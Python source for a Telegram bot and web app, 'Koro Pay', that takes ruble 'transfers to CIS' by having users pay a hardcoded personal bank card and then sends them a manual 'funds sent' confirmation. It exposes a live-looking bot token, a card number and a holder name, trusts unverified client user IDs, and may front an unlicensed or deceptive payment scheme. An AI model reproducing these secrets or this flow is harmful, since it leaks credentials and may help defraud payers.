import asyncio
import json
import logging
import os
import random
import time
from aiogram import Bot, Dispatcher, F, types
from aiogram.filters import CommandStart
from aiogram.types import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    WebAppInfo,
)
from aiohttp import web

# === ТВОИ ДАННЫЕ ===
TOKEN = "8639644231:AAF2-UwFK-lxtaqqwHOi6zPf8pcQ8xe5vGY"
ADMIN_CHAT_ID = 6084347801
WEBAPP_URL = "https://koropay-en5x.onrender.com"
# ===================

RECEIVE_CARD = "2200 3204 4647 4787"
RECEIVE_BANK = "Озон Банк"
RECEIVE_HOLDER = "Mirelem Ismailzade"

# Словарь для антиспама (хранит время последнего запроса пользователя)
user_cooldowns = {}

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher()


@dp.message(CommandStart())
async def cmd_start(message: types.Message):
  web_app_kb = InlineKeyboardMarkup(
      inline_keyboard=[
          [
              InlineKeyboardButton(
                  text="💸 Отправить перевод в СНГ",
                  web_app=WebAppInfo(url=WEBAPP_URL),
              )
          ]
      ]
  )
  welcome_text = (
      "<b>🌐 Koro Pay — Международные переводы в СНГ</b>\n\n"
      "Безопасно, быстро и по выгодному курсу.\n"
      "Лимит перевода: до 25 000 ₽ за раз.\n\n"
      "<i>Нажмите кнопку ниже, чтобы открыть приложение.</i>"
  )
  await message.answer(
      welcome_text, reply_markup=web_app_kb, parse_mode="HTML"
  )


# Обработка заявок от Web App с защитой
async def api_order_handler(request):
  try:
    data = await request.json()
    user_id = data.get("user_id", 0)

    # 1. Проверка антиспама (Кулдаун 60 секунд)
    current_time = time.time()
    if user_id in user_cooldowns and current_time - user_cooldowns[user_id] < 60:
      return web.json_response(
          {
              "status": "error",
              "message": "Подождите минуту перед созданием новой заявки.",
          },
          status=400,
      )

    user_cooldowns[user_id] = current_time

    country = data.get("country", "СНГ")
    rub_amount = data.get("rub_amount", "0")
    local_received = data.get("local_received", "0")
    currency = data.get("currency", "VAL")
    recipient_name = data.get("recipient_name", "Не указано")
    recipient_card = data.get("recipient_card", "Не указано")
    user_name = data.get("username", "Аноним")

    user_info = f"@{user_name}" if user_name != "Аноним" else f"ID: {user_id}"
    tx_id = f"KP-{random.randint(100000, 999999)}"

    admin_kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="✅ Подтвердить перевод (Пришло)",
                    callback_data=f"approve_{user_id}_{tx_id}",
                )
            ]
        ]
    )

    admin_message = (
        f"🚨 <b>Новый защищенный перевод! [<code>{tx_id}</code>]</b>\n\n"
        f"👤 Клиент: {user_info} (ID: <code>{user_id}</code>)\n"
        f"🌍 Направление: <b>{country}</b>\n"
        f"🇷🇺 Получено от клиента: <b>{rub_amount} RUB</b>\n"
        f"💶 К выплате получателю: <b>{local_received} {currency}</b>\n\n"
        f"👤 Получатель: <b>{recipient_name}</b>\n"
        f"💳 Карта получателя: <code>{recipient_card}</code>\n\n"
        f"👉 Проверьте Озон Банк ({RECEIVE_CARD}). Убедитесь, что оплата с личной карты клиента:"
    )

    if ADMIN_CHAT_ID:
      await bot.send_message(
          ADMIN_CHAT_ID, admin_message, parse_mode="HTML", reply_markup=admin_kb
      )

    return web.json_response({"status": "success", "tx_id": tx_id})
  except Exception as e:
    logging.error(f"Ошибка API: {e}")
    return web.json_response(
        {"status": "error", "message": str(e)}, status=400
    )


@dp.callback_query(F.data.startswith("approve_"))
async def process_approve(callback: types.CallbackQuery):
  parts = callback.data.split("_")
  target_user_id = int(parts[1])
  tx_id = parts[2]

  await callback.message.edit_text(
      callback.message.text
      + f"\n\n✅ <b>ПЛАТЕЖ ПОДТВЕРЖДЕН И ОТПРАВЛЕН!</b> [Транзакция: {tx_id}]",
      parse_mode="HTML",
  )

  try:
    success_text = (
        f"🎉 <b>Ваш перевод успешно выполнен!</b>\n\n"
        f"🆔 Номер транзакции: <code>{tx_id}</code>\n"
        f"✅ Средства отправлены получателю.\n\n"
        f"Благодарим за доверие к <b>Koro Pay</b>!"
    )
    await bot.send_message(target_user_id, success_text, parse_mode="HTML")
  except Exception as e:
    logging.error(f"Не удалось отправить уведомление клиенту: {e}")

  await callback.answer("Перевод подтвержден!")


async def webapp_handler(request):
  html_content = f"""
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Koro Pay — Безопасные переводы</title>
        <script src="https://telegram.org/js/telegram-web-app.js"></script>
        <style>
            :root {{
                --bg-color: #0c0d12;
                --card-bg: #151721;
                --card-inner: #1e2130;
                --accent: #8b5cf6;
                --accent-gradient: linear-gradient(135deg, #a855f7 0%, #6366f1 100%);
                --text-main: #ffffff;
                --text-muted: #9ca3af;
                --border: rgba(139, 92, 246, 0.2);
                --success: #22c55e;
                --error: #ef4444;
            }}
            body {{
                background: var(--bg-color);
                color: var(--text-main);
                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                margin: 0; padding: 16px;
                display: flex; flex-direction: column; align-items: center;
                min-height: 100vh; box-sizing: border-box;
            }}
            .container {{
                width: 100%; max-width: 400px; margin: auto;
                background: var(--card-bg); border: 1px solid var(--border);
                border-radius: 20px; padding: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
                box-sizing: border-box;
            }}
            h2 {{ margin: 0 0 4px 0; font-size: 20px; text-align: center; }}
            .subtitle {{ font-size: 11px; color: var(--text-muted); text-align: center; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 1px; }}
            
            .form-group {{ margin-bottom: 14px; }}
            label {{ font-size: 11px; font-weight: 700; color: var(--text-muted); display: block; margin-bottom: 6px; text-transform: uppercase; }}
            input, select {{
                width: 100%; padding: 12px; background: var(--card-inner);
                border: 1px solid rgba(255,255,255,0.08); border-radius: 10px;
                color: #fff; font-size: 15px; box-sizing: border-box;
            }}
            input:focus, select:focus {{ border-color: var(--accent); outline: none; }}
            
            .calc-box {{
                background: rgba(139,92,246,0.08); border: 1px dashed rgba(139,92,246,0.3);
                border-radius: 10px; padding: 12px; margin-bottom: 16px;
                display: flex; justify-content: space-between; align-items: center;
            }}
            .calc-val {{ font-size: 18px; font-weight: bold; color: #c084fc; }}
            
            .security-notice {{
                font-size: 11px; color: var(--text-muted); background: rgba(239, 68, 68, 0.08);
                border: 1px solid rgba(239, 68, 68, 0.2); border-radius: 8px; padding: 10px; margin-bottom: 14px; line-height: 1.4;
            }}
            
            .checkbox-group {{
                display: flex; align-items: flex-start; gap: 8px; font-size: 12px; color: var(--text-muted); margin-bottom: 16px;
            }}
            .checkbox-group input {{ width: 16px; height: 16px; margin-top: 2px; accent-color: var(--accent); }}

            button.main-btn {{
                width: 100%; padding: 14px; background: var(--accent-gradient);
                color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: bold;
                cursor: pointer; box-shadow: 0 4px 15px rgba(139,92,246,0.4);
            }}
            
            .screen {{ display: none; }}
            .active {{ display: block; }}
            
            .req-box {{
                background: var(--card-inner); border: 1px solid var(--border);
                border-radius: 12px; padding: 14px; margin: 12px 0; text-align: left;
            }}
            .copy-btn {{
                background: rgba(139,92,246,0.2); border: 1px solid var(--accent);
                color: #c084fc; padding: 8px; border-radius: 8px; font-size: 13px;
                font-weight: bold; cursor: pointer; width: 100%; margin-top: 8px;
            }}
            .timer {{
                font-size: 14px; color: #f59e0b; text-align: center; font-weight: bold; margin-bottom: 10px;
            }}
            .spinner {{
                font-size: 40px; text-align: center; margin: 20px 0;
                animation: pulse 1.5s infinite;
            }}
            @keyframes pulse {{ 0% {{ opacity: 0.3; }} 50% {{ opacity: 1; }} 100% {{ opacity: 0.3; }} }}
        </style>
    </head>
    <body>
        <div class="container">
            <!-- ЭКРАН 1: ВВОД ДАННЫХ -->
            <div id="screenForm" class="screen active">
                <h2>Koro Pay</h2>
                <div class="subtitle">Защищенные переводы в СНГ</div>

                <div class="form-group">
                    <label for="country">Страна назначения</label>
                    <select id="country" onchange="calculateLocal()">
                        <option value="Uzbekistan|UZS|135">🇺🇿 Узбекистан (UZS)</option>
                        <option value="Tajikistan|TJS|0.12">🇹🇯 Таджикистан (TJS)</option>
                        <option value="Kyrgyzstan|KGS|0.95">🇰🇬 Киргизия (KGS)</option>
                        <option value="Azerbaijan|AZN|0.018">🇦🇿 Азербайджан (AZN)</option>
                    </select>
                </div>

                <div class="form-group">
                    <label for="amount">Сумма отправки (в рублях)</label>
                    <input type="number" id="amount" placeholder="Макс. 25 000 ₽" oninput="calculateLocal()">
                </div>

                <div class="calc-box">
                    <span>Получатель заберет:</span>
                    <span class="calc-val" id="totalLocal">0 UZS</span>
                </div>

                <div class="form-group">
                    <label for="recName">ФИО получателя</label>
                    <input type="text" id="recName" placeholder="Иван Иванов">
                </div>

                <div class="form-group">
                    <label for="recCard">Номер карты получателя</label>
                    <input type="text" id="recCard" placeholder="Номер карты">
                </div>

                <div class="security-notice">
                    🛡 <b>Безопасность:</b> Перевод должен осуществляться строго с вашей личной карты. Третьи лица не допускаются.
                </div>

                <div class="checkbox-group">
                    <input type="checkbox" id="termsCheck">
                    <label for="termsCheck" style="text-transform: none; display: inline; color: var(--text-muted); cursor: pointer;">
                        Я согласен с условиями оферты и подтверждаю легальность средств.
                    </label>
                </div>

                <button class="main-btn" onclick="submitForm()">Продолжить</button>
            </div>

            <!-- ЭКРАН 2: ОПЛАТА ПО РЕКВИЗИТАМ С ТАЙМЕРОМ -->
            <div id="screenPay" class="screen">
                <h2>Оплата перевода</h2>
                <div class="subtitle">Защищенный шлюз</div>

                <div class="timer" id="timerDisplay">Осталось времени: 15:00</div>

                <div class="req-box">
                    <div style="font-size: 11px; color: var(--text-muted);">К ОПЛАТЕ:</div>
                    <div id="payRubSum" style="font-size: 20px; font-weight: bold; color: #c084fc; margin-top: 4px;">0 ₽</div>
                </div>

                <div class="req-box">
                    <div style="font-size: 11px; color: var(--text-muted);">РЕКВИЗИТЫ ({RECEIVE_BANK}):</div>
                    <div style="font-size: 16px; font-weight: bold; margin-top: 4px; word-break: break-all;">{RECEIVE_CARD}</div>
                    <div style="font-size: 12px; color: var(--text-muted); margin-top: 4px;">Получатель: <b>{RECEIVE_HOLDER}</b></div>
                    <button class="copy-btn" onclick="copyCard()">📋 Скопировать карту</button>
                </div>

                <button class="main-btn" onclick="confirmPayment()" style="background: var(--success); box-shadow: 0 4px 15px rgba(34,197,94,0.4);">Я оплатил(а)</button>
            </div>

            <!-- ЭКРАН 3: ОЖИДАНИЕ ПРОВЕРКИ АДМИНОМ -->
            <div id="screenWait" class="screen" style="text-align: center;">
                <div class="spinner">⏳</div>
                <h3 style="margin: 0 0 8px 0;">Проверка платежа</h3>
                <p style="color: var(--text-muted); font-size: 13px; line-height: 1.5;">
                    Мы проверяем поступление средств на наш счет. Пожалуйста, ожидайте, скоро здесь появится статус подтверждения.
                </p>
            </div>
        </div>

        <script>
            let tg = window.Telegram.WebApp;
            tg.expand();

            let currentMultiplier = 135;
            let currentCurr = 'UZS';
            let enteredRub = 0;
            let calculatedLocal = 0;
            let timerInterval;

            // Запускаем расчет сразу при открытии, чтобы подхватить дефолтную валюту
            window.onload = function() {{
                calculateLocal();
            }};

            function calculateLocal() {{
                let val = document.getElementById('country').value.split('|');
                currentCurr = val[1];
                currentMultiplier = parseFloat(val[2]);

                enteredRub = parseFloat(document.getElementById('amount').value) || 0;
                calculatedLocal = Math.round(enteredRub * currentMultiplier);
                
                document.getElementById('totalLocal').textContent = enteredRub > 0 ? calculatedLocal.toLocaleString('ru-RU') + ' ' + currentCurr : '0 ' + currentCurr;
            }}

            function copyCard() {{
                navigator.clipboard.writeText("{RECEIVE_CARD}".replace(/\\s+/g, ''));
                let btn = document.querySelector('.copy-btn');
                btn.textContent = '✅ Скопировано!';
                setTimeout(() => {{ btn.textContent = '📋 Скопировать карту'; }}, 2000);
            }}

            function startTimer(duration) {{
                let timer = duration, minutes, seconds;
                clearInterval(timerInterval);
                timerInterval = setInterval(function () {{
                    minutes = parseInt(timer / 60, 10);
                    seconds = parseInt(timer % 60, 10);

                    minutes = minutes < 10 ? "0" + minutes : minutes;
                    seconds = seconds < 10 ? "0" + seconds : seconds;

                    document.getElementById('timerDisplay').textContent = "Осталось времени: " + minutes + ":" + seconds;

                    if (--timer < 0) {{
                        clearInterval(timerInterval);
                        alert('Время ожидания истекло. Создайте заявку заново.');
                        location.reload();
                    }}
                }}, 1000);
            }}

            async function submitForm() {{
                enteredRub = parseFloat(document.getElementById('amount').value) || 0;
                let name = document.getElementById('recName').value.trim();
                let card = document.getElementById('recCard').value.trim();
                let termsChecked = document.getElementById('termsCheck').checked;

                if (enteredRub <= 0) {{
                    alert('Введите сумму перевода в рублях!');
                    return;
                }}
                if (enteredRub > 25000) {{
                    alert('Максимальная сумма отправки составляет 25 000 рублей!');
                    return;
                }}
                if (!name || !card) {{
                    alert('Заполните данные получателя!');
                    return;
                }}
                if (!termsChecked) {{
                    alert('Необходимо согласиться с условиями оферты!');
                    return;
                }}

                document.getElementById('payRubSum').textContent = enteredRub.toLocaleString('ru-RU') + ' ₽';
                
                document.getElementById('screenForm').classList.remove('active');
                document.getElementById('screenPay').classList.add('active');

                // Запускаем таймер на 15 минут (900 секунд)
                startTimer(900);
            }}

            async function confirmPayment() {{
                let countrySelect = document.getElementById('country');
                let countryName = countrySelect.options[countrySelect.selectedIndex].text;
                let name = document.getElementById('recName').value;
                let card = document.getElementById('recCard').value;

                let user = (tg.initDataUnsafe && tg.initDataUnsafe.user) ? tg.initDataUnsafe.user : {{}};

                clearInterval(timerInterval);
                document.getElementById('screenPay').classList.remove('active');
                document.getElementById('screenWait').classList.add('active');

                try {{
                    let response = await fetch('/api/order', {{
                        method: 'POST',
                        headers: {{ 'Content-Type': 'application/json' }},
                        body: JSON.stringify({{
                            country: countryName,
                            rub_amount: enteredRub + ' ₽',
                            local_received: calculatedLocal.toLocaleString('ru-RU'),
                            currency: currentCurr,
                            recipient_name: name,
                            recipient_card: card,
                            username: user.username || 'Аноним',
                            user_id: user.id || 0
                        }})
                    }});
                    
                    let result = await response.json();
                    if (!response.ok) {{
                        alert(result.message || 'Ошибка обработки заявки.');
                        location.reload();
                    }}
                }} catch (e) {{
                    alert('Ошибка связи с сервером.');
                }}
            }}
        </script>
    </body>
    </html>
    """
  return web.Response(text=html_content, content_type="text/html")


async def main():
  app = web.Application()
  app.router.add_get("/", webapp_handler)
  app.router.add_post("/api/order", api_order_handler)

  runner = web.AppRunner(app)
  await runner.setup()
  port = int(os.environ.get("PORT", 8080))
  site = web.TCPSite(runner, "0.0.0.0", port)
  await site.start()
  logging.info(f"Защищенный сервер запущен на порту {port}...")

  logging.info("Бот Koro Pay запущен...")
  await dp.start_polling(bot)


if __name__ == "__main__":
  asyncio.run(main())